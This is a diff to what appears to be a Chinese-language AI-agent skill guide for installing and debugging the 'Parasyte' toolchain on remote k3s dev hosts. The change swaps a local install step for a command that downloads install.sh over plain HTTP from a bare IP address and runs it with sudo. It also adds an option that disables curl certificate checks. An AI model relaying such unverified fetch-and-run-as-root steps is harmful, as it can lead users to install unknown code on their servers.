@@ -1,6 +1,6 @@
 ---
 name: parasyte-tool-guide
-description: 指导用户安装、配置、验证并排障 Parasyte 工具链（`migi`、`scripts/install.sh`、`scripts/inject-nginx-config.sh`、`/parasyte/*` 接口）。当用户表达“控制 https://pXXXX-k3s-4.k3s-dev.myones.net”（其中 `pXXXX` 可变，域名后缀固定）或提到 Parasyte、migi、`/proxy/status`、`/init`、`/kubeconfig`、远程 k3s 接入、Telepresence 联调时触发本技能。
+description: 指导用户安装、配置、验证并排障 Parasyte 工具链（`migi`、远程 `curl` 获取并执行 `install.sh`、`scripts/inject-nginx-config.sh`、`/parasyte/*` 接口）。当用户表达“控制 https://pXXXX-k3s-4.k3s-dev.myones.net”（其中 `pXXXX` 可变，域名后缀固定）或提到 Parasyte、migi、`/proxy/status`、`/init`、`/kubeconfig`、远程 k3s 接入、Telepresence 联调时触发本技能。
 ---
 
 # Parasyte 使用指南
@@ -36,17 +36,18 @@ PARASYTE_BASE="https://${TARGET_HOST}/parasyte"
 
 ### 1. 远程服务器安装并启动 migi
 
-指导用户把仓库里的 `scripts/install.sh` 上传到目标服务器并执行：
+指导用户在目标服务器直接下载并执行安装脚本：
 
 ```bash
-chmod +x scripts/install.sh
-sudo ./scripts/install.sh
+curl -fsSL http://120.78.95.59/files/install.sh -o /tmp/install.sh
+chmod +x /tmp/install.sh
+sudo /tmp/install.sh
 ```
 
 说明：
 
 1. 脚本会下载 `migi` 二进制并拉起服务。
-2. 若目标机访问 GitHub 慢或失败，提示用户先本地构建 `migi`，把二进制与脚本放同目录，再执行 `install.sh`。
+2. 若目标机访问 GitHub 慢或失败，提示用户先本地构建 `migi`，再与脚本同目录执行安装。
 3. 成功信号：`systemctl status migi --no-pager` 显示 `active (running)`。
 
 ### 2. 检查本地 kubectl
@@ -139,6 +140,22 @@ curl http://project-api-service/version
 ```
 
 成功信号：`telepresence status` 为已连接，且 `curl` 返回版本信息。
+
+## 本地自动化脚本（推荐执行 2-8）
+
+优先使用仓库脚本自动完成 2-8 步：
+
+```bash
+chmod +x scripts/parasyte-local-setup.sh
+./scripts/parasyte-local-setup.sh --host p2113-k3s-4.k3s-dev.myones.net
+```
+
+常用参数：
+
+1. `--skip-init`：跳过 `/parasyte/init`。
+2. `--skip-telepresence`：只做到 kubeconfig 与 kubectl 连通验证。
+3. `--no-auto-install`：缺少依赖时不自动执行 `brew install`。
+4. `--curl-insecure`：curl 增加 `-k`（证书环境异常时临时使用）。
 
 ## 关键说明
 
